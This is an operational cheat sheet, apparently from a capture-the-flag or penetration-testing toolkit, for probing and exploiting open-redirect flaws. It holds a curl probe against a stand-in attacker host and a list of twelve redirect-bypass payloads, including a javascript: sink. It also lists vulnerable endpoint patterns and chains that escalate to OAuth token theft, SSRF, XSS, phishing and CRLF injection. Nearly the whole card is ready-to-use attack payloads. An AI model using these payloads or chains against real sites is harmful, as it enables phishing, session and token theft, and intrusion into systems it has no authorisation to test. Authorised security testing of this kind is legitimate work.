# Quick reference (deep) — the 90-second operational card

## The probe — the one-liner

```bash
curl -si --max-time 10 "$BASE/login?next=https%3A%2F%2Fattacker.invalid%2Flanding" | grep -i '^location'
# Location: https://attacker.invalid/landing  <- CANDIDATE
# Location: /                                 <- safe arm
# (no Location:)                              <- weak-negative — wrong param
```

## The tool — the sweep

```bash
python3 tools/web/redirect_probe.py --url "$BASE/login" --param next
python3 tools/web/redirect_probe.py --selftest
```

## The fingerprint — the Location shape

```text
Location: <canary>          -> no filter — CANDIDATE
Location: /                 -> forced-relative — the //, /\, %5c arms
Location: <allowlisted>     -> a host-allowlist — the @, subdomain arms
Location: <partial>         -> a path-force — the suffix/substring arms
Location: <relative>        -> a same-origin-resolution — NOT the gap
no Location:                -> a weak-negative — the param name is wrong
```

## The arms — the fast 12

```text
//evil.com                  /\evil.com              \\evil.com
/%5cevil.com                https://target.com@evil.com
evil.com\@target.com        https://target.com.evil.com
https://evil.com/target.com https:evil.com
https%3a%2f%2fevil.com      https%253a%252f%252fevil.com
javascript:alert(1)
```

## The surfaces — the endpoints

```text
/login?next=    /logout?next=    /oauth/authorize?redirect_uri=
/out?url=       /goto?url=       /link?target=   /back<-Referer
/error?next=    /checkout?successUrl=   /img?url=   /share?link=
the stored set-then-fire    the meta-refresh    the JS-nav    the hash
```

## The verdicts — the 5-run ladder

```text
Location: <canary>  -> confirms --evidence-kind class
Location: <safe>    -> negative — that arm blocked
Location: <safe> on all arms -> falsifies — the class closed
no Location:        -> negative (weak) — wrong param
the chain fires     -> confirms --evidence-kind impact
```

## The chain — the routes

```text
open-redirect -> OAuth redirect_uri launder -> the code/token on the canary
open-redirect -> SSRF fetch-follow          -> the internal host
open-redirect -> javascript:/data: sink     -> the XSS
open-redirect -> bot-visit                  -> the bot's session/content
open-redirect -> phishing/domain-launder    -> the standalone answer
open-redirect -> %0d%0a in the Location     -> the CRLF split
```

## The evidence — the post-probe

```bash
python3 tools/hooks.py post-probe <challenge> --hypothesis-id <id> \
  --class web-open-redirect --verdict confirms --evidence-kind class \
  --evidence 'Location: https://attacker.invalid' \
  --response '<the verbatim 302>'
```

## The traps — the 4 most-costly

```text
1. `curl -L` — follows the redirect; the Location is never read
2. `Location: evil.com` — resolves RELATIVE — same-origin, not the gap
3. a `Location:` on a non-3xx — not a nav redirect — read the status
4. a uniform `Location: <safe>` — the falsifier, not a new arm to try
```
